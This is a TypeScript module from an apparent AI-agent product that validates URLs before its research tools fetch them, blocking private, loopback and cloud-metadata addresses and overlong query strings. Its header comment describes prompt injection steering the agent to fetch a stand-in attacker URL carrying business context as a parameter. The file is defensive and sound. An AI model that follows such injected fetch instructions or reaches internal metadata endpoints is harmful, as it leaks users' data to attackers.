/**
 * FounderOS — Research Egress Guard (H2 fix)
 * ============================================
 * Research tools with network egress (`scrape_url`, `crawl_site`, and
 * `deep_research`'s per-URL fallback) are, by design, ungated reads that fetch
 * ARBITRARY attacker-influenced URLs — the model decides what to scrape, and a
 * prompt-injected email/web page can steer it ("fetch https://evil.tld/verify?
 * ctx=<business context>"). A domain allowlist isn't viable here (legitimate
 * research means visiting unpredictable prospect/company sites), so this is
 * the narrower, real mitigation:
 *
 *   1. Block SSRF-style targets — private/loopback/link-local IPs and the
 *      cloud metadata endpoint (169.254.169.254) that a legitimate research
 *      URL never needs to hit, but an internal-network pivot would.
 *   2. Cap query-string length — a common exfiltration shape is a stolen
 *      payload smuggled as a URL parameter (`?data=<huge blob>`); a normal
 *      research URL's query string is short.
 *   3. (Caller-side) log every target URL so egress is auditable after the
 *      fact — see the log.info call at each research.ts call site.
 *
 * Pure, no I/O — fully unit-testable.
 */

const MAX_QUERY_STRING_LENGTH = 500;

const PRIVATE_IPV4_RE =
  /^(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0$|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.)|^172\.(1[6-9]|2\d|3[01])\./;

/** Cloud metadata endpoints — never a legitimate research target. */
const METADATA_HOSTS = new Set(["169.254.169.254", "metadata.google.internal"]);

function isPrivateOrLoopbackHost(hostname: string): boolean {
  // Node's URL.hostname keeps the brackets on an IPv6 literal (e.g. "[::1]").
  const h = hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local")) return true;
  if (METADATA_HOSTS.has(h)) return true;
  if (PRIVATE_IPV4_RE.test(h)) return true;
  // IPv6 loopback / link-local / unique-local.
  if (h === "::1" || h.startsWith("fe80:") || h.startsWith("fc") || h.startsWith("fd")) return true;
  return false;
}

export type EgressCheck = { ok: true } | { ok: false; reason: string };

/**
 * Validate a research-tool target URL. Returns ok:false with a founder/agent
 * -readable reason when the URL should not be fetched.
 */
export function resolveEgressUrl(rawUrl: string): EgressCheck {
  let parsed: URL;
  try {
    parsed = new URL(rawUrl);
  } catch {
    return { ok: false, reason: `Invalid URL: "${rawUrl}".` };
  }

  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
    return { ok: false, reason: `Denied: only http/https URLs may be fetched (got "${parsed.protocol}").` };
  }

  if (isPrivateOrLoopbackHost(parsed.hostname)) {
    return { ok: false, reason: `Denied: "${parsed.hostname}" is a private/internal/metadata address, not a public research target.` };
  }

  if (parsed.search.length > MAX_QUERY_STRING_LENGTH) {
    return {
      ok: false,
      reason: `Denied: query string is ${parsed.search.length} chars (max ${MAX_QUERY_STRING_LENGTH}) — looks like a data payload, not a normal research URL.`,
    };
  }

  return { ok: true };
}
